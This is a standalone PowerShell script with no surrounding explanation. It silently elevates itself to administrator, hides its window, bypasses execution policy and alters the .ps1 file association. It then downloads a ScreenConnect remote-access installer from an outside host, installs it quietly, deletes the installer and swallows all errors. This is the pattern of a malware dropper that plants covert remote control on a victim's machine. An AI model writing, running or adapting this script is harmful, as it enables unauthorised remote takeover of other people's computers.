if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList $arguments
    exit
}


try {
    $ErrorActionPreference = "SilentlyContinue"
    
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.ps1\UserChoice" -Name "Progid" -Value "Applications\powershell.exe" -ErrorAction SilentlyContinue
    
    $url = "https://earthlink7.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
    $output = "$env:TEMP\ScreenConnect.ClientSetup.exe"
    
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $webClient.DownloadFile($url, $output)
    $webClient.Dispose()
    
    if (Test-Path $output) {
        $process = Start-Process -FilePath $output -ArgumentList "/quiet /norestart" -Wait -PassThru -WindowStyle Hidden
        
        if ($process.ExitCode -ne 0) {
            $process = Start-Process -FilePath $output -ArgumentList "/S /silent /norestart" -Wait -PassThru -WindowStyle Hidden
        }
        
        Start-Sleep -Milliseconds 500
        Remove-Item $output -Force -ErrorAction SilentlyContinue
    }
} catch {
    exit 0
}

exit 0
